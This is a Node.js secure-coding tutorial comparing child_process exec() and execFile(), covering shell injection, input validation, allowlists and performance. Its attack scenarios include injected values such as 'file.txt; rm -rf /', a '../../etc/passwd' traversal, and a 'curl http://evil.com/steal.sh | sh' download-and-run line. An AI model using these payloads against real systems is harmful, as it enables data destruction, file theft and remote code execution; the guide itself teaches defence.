# execFile() vs exec(): Security and Efficiency

## Introduction

This guide explains the critical differences between `execFile()` and `exec()`, with a focus on security and performance considerations.

---

## Quick Comparison

| Aspect | exec() | execFile() |
|--------|--------|------------|
| Spawns shell | Yes | No |
| Security | Lower (shell injection risk) | Higher (no shell) |
| Performance | Slower (shell overhead) | Faster (direct execution) |
| Shell features | Available (pipes, redirects) | Not available |
| Command format | String: `'ls -la'` | Separate: `'ls', ['-la']` |
| Best for | Shell commands | Direct executables |

---

## exec() - With Shell

### How It Works

```javascript
const { exec } = require('child_process');

exec('ls -la | grep .js', (error, stdout) => {
  console.log(stdout);
});
```

**Process chain:**
```
Node.js → Shell (/bin/sh or cmd.exe) → Command → Result → Node.js
```

### Advantages

1. **Shell Features Available**
```javascript
// Pipes work
exec('ls -la | grep .js | sort');

// Redirects work
exec('cat file.txt > output.txt');

// Environment variable expansion
exec('echo $HOME');

// Wildcards
exec('cat *.txt');
```

2. **Simple Syntax**
```javascript
// Single string command
exec('git status');
```

### Disadvantages

1. **Security Risk: Command Injection**
```javascript
// DANGEROUS!
const filename = req.params.file;  // Could be: "file.txt; rm -rf /"
exec(`cat ${filename}`, callback);

// Attacker could inject: cat file.txt; rm -rf /
```

2. **Performance Overhead**
```javascript
// Slower: spawns shell + command
exec('node --version');  // ~30ms

// vs

// Faster: direct execution
execFile('node', ['--version']);  // ~15ms
```

---

## execFile() - Without Shell

### How It Works

```javascript
const { execFile } = require('child_process');

execFile('ls', ['-la'], (error, stdout) => {
  console.log(stdout);
});
```

**Process chain:**
```
Node.js → Command (direct) → Result → Node.js
```

### Advantages

1. **More Secure**
```javascript
// SAFE: No shell, no injection possible
const filename = req.params.file;  // Even if: "file.txt; rm -rf /"
execFile('cat', [filename], callback);

// Treated as literal argument to 'cat': cat "file.txt; rm -rf /"
// Safe!
```

2. **Better Performance**
```javascript
// No shell overhead
execFile('node', ['--version']);  // Faster
```

3. **Explicit Arguments**
```javascript
// Clear, unambiguous
execFile('git', ['commit', '-m', 'My commit']);
```

### Disadvantages

1. **No Shell Features**
```javascript
// Doesn't work - pipes are a shell feature!
execFile('ls | grep .js');  // Error: file not found

// Wildcards don't work
execFile('cat', ['*.txt']);  // Looks for file named "*.txt"
```

2. **More Verbose**
```javascript
// exec: simple string
exec('git commit -m "message"');

// execFile: array of arguments
execFile('git', ['commit', '-m', 'message']);
```

---

## Security Deep Dive

### Command Injection Attack

```javascript
// Vulnerable code
app.get('/download', (req, res) => {
  const filename = req.query.file;
  exec(`cat ${filename}`, (error, stdout) => {
    res.send(stdout);
  });
});

// Attack scenarios:
// 1. /download?file=../../etc/passwd
// 2. /download?file=file.txt; rm -rf /
// 3. /download?file=file.txt && curl http://evil.com/steal.sh | sh
```

### Safe Approaches

#### 1. Use execFile()
```javascript
// Safe: no shell interpretation
app.get('/download', (req, res) => {
  const filename = req.query.file;
  execFile('cat', [filename], (error, stdout) => {
    res.send(stdout);
  });
});
```

#### 2. Validate Input
```javascript
const path = require('path');

function validateFilename(filename) {
  // Only allow alphanumeric, dots, hyphens
  if (!/^[a-zA-Z0-9.-]+$/.test(filename)) {
    throw new Error('Invalid filename');
  }
  return filename;
}

app.get('/download', (req, res) => {
  try {
    const safe = validateFilename(req.query.file);
    execFile('cat', [safe], (error, stdout) => {
      res.send(stdout);
    });
  } catch (error) {
    res.status(400).send('Invalid filename');
  }
});
```

#### 3. Use Allowlists
```javascript
const ALLOWED_FILES = ['config.json', 'data.txt', 'report.pdf'];

app.get('/download', (req, res) => {
  const filename = req.query.file;

  if (!ALLOWED_FILES.includes(filename)) {
    return res.status(403).send('File not allowed');
  }

  execFile('cat', [filename], (error, stdout) => {
    res.send(stdout);
  });
});
```

---

## When to Use Each

### Use exec() When:

1. **You need shell features**
```javascript
// Pipes
exec('cat log.txt | grep ERROR | sort');

// Redirects
exec('node script.js > output.log 2>&1');

// Environment variables
exec('echo $PATH');

// Wildcards
exec('tar czf backup.tar.gz *.txt');
```

2. **Input is trusted**
```javascript
// Hardcoded commands in your own scripts
exec('npm install');
exec('git pull origin main');
```

3. **Convenience matters more than security**
```javascript
// Build scripts, CLI tools (not servers!)
exec('npm run build && npm run test');
```

### Use execFile() When:

1. **Security is important**
```javascript
// User input involved
const userFile = getUserInput();
execFile('cat', [userFile]);
```

2. **Performance matters**
```javascript
// High-frequency operations
for (let i = 0; i < 1000; i++) {
  execFile('process-item', [items[i]]);
}
```

3. **No shell features needed**
```javascript
// Direct executable calls
execFile('node', ['--version']);
execFile('/usr/bin/custom-tool', ['--flag']);
```

---

## Practical Examples

### Example 1: File Operations (Safe)
```javascript
const { execFile } = require('child_process');
const { promisify } = require('util');
const execFileAsync = promisify(execFile);

async function safeFileOperation(operation, filename) {
  // Validate filename
  if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
    throw new Error('Invalid filename');
  }

  try {
    switch (operation) {
      case 'read':
        const { stdout } = await execFileAsync('cat', [filename]);
        return stdout;

      case 'stat':
        const { stdout: stats } = await execFileAsync('stat', [filename]);
        return stats;

      case 'checksum':
        const { stdout: hash } = await execFileAsync('sha256sum', [filename]);
        return hash.split(' ')[0];

      default:
        throw new Error('Unknown operation');
    }
  } catch (error) {
    throw new Error(`Operation failed: ${error.message}`);
  }
}

// Usage
const content = await safeFileOperation('read', 'config.json');
const checksum = await safeFileOperation('checksum', 'data.txt');
```

### Example 2: Git Operations (Mixed)
```javascript
// Use execFile for user-provided input
async function gitAddFile(filename) {
  // User specifies filename - use execFile
  await execFileAsync('git', ['add', filename]);
}

// Use exec for complex git commands (trusted)
async function gitStatus() {
  // Our command, no user input - exec is fine
  const { stdout } = await execAsync('git status --short');
  return stdout;
}

// Combine both approaches
async function gitCommitFile(filename, message) {
  // Validate inputs
  if (!/^[a-zA-Z0-9._/-]+$/.test(filename)) {
    throw new Error('Invalid filename');
  }

  // Add file (user input) - use execFile
  await execFileAsync('git', ['add', filename]);

  // Commit (controlled message) - use execFile to be safe
  await execFileAsync('git', ['commit', '-m', message]);
}
```

### Example 3: Image Processing
```javascript
async function processImage(inputPath, outputPath, options) {
  // Validate paths
  const validatePath = (p) => {
    if (!/^[a-zA-Z0-9._/-]+$/.test(p)) {
      throw new Error('Invalid path');
    }
  };

  validatePath(inputPath);
  validatePath(outputPath);

  // Build args array
  const args = [
    inputPath,
    '-resize', `${options.width}x${options.height}`,
    '-quality', String(options.quality || 80),
    outputPath
  ];

  // Use execFile - no shell needed
  await execFileAsync('convert', args);
}

// Usage
await processImage(
  'input.jpg',
  'output.jpg',
  { width: 800, height: 600, quality: 85 }
);
```

---

## Performance Comparison

### Benchmark
```javascript
const { exec, execFile } = require('child_process');
const { promisify } = require('util');

async function benchmark() {
  const iterations = 100;

  // Test exec()
  console.time('exec');
  for (let i = 0; i < iterations; i++) {
    await promisify(exec)('node --version');
  }
  console.timeEnd('exec');

  // Test execFile()
  console.time('execFile');
  for (let i = 0; i < iterations; i++) {
    await promisify(execFile)('node', ['--version']);
  }
  console.timeEnd('execFile');
}

// Results (approximate):
// exec: ~3000ms
// execFile: ~1500ms
// execFile is ~2x faster!
```

---

## Migration Guide

### Converting from exec() to execFile()

```javascript
// Before (exec)
exec('git status', callback);
exec('git commit -m "message"', callback);
exec(`cat ${file}`, callback);

// After (execFile)
execFile('git', ['status'], callback);
execFile('git', ['commit', '-m', 'message'], callback);
execFile('cat', [file], callback);
```

### Handling Shell Features

If you need shell features, use spawn() with shell option:

```javascript
// Instead of exec() with pipes
exec('ls -la | grep .js', callback);

// Use spawn() with shell
const child = spawn('ls -la | grep .js', {
  shell: true
});

child.stdout.on('data', (data) => {
  console.log(data.toString());
});
```

---

## Best Practices

### 1. Default to execFile()
```javascript
// Start with execFile() by default
execFile('command', ['args']);

// Only use exec() when you specifically need shell features
```

### 2. Never Trust User Input
```javascript
// Bad
const input = req.params.value;
exec(`command ${input}`);

// Good
const input = req.params.value;
execFile('command', [input]);
```

### 3. Validate Everything
```javascript
function sanitizeInput(input) {
  // Allow only safe characters
  if (!/^[a-zA-Z0-9._-]+$/.test(input)) {
    throw new Error('Invalid input');
  }
  return input;
}

const safe = sanitizeInput(userInput);
execFile('command', [safe]);
```

### 4. Use Timeouts
```javascript
// Both exec and execFile support timeouts
execFile('command', ['args'], {
  timeout: 5000
}, callback);
```

---

## Summary

### Decision Matrix

| Scenario | Use | Reason |
|----------|-----|---------|
| User input | execFile() | Security |
| No shell features needed | execFile() | Performance |
| Pipes/redirects needed | exec() or spawn() | Functionality |
| Trusted commands only | Either | Preference |
| High frequency | execFile() | Performance |
| Build scripts | exec() | Convenience |

### Key Points

1. **execFile() is safer** - No shell injection risk
2. **execFile() is faster** - No shell overhead
3. **exec() is more powerful** - Shell features available
4. **Default to execFile()** - Use exec() only when needed
5. **Always validate input** - Regardless of method

### Quick Reference

```javascript
// exec - with shell
exec('ls -la | grep .js', callback);

// execFile - no shell
execFile('ls', ['-la'], callback);
```

### Next Steps

- [fork() Method Guide](./05-fork-method.md)
- [Choosing the Right Method](./06-choosing-the-right-method.md)

---

Continue to [fork() Method Guide](./05-fork-method.md)!
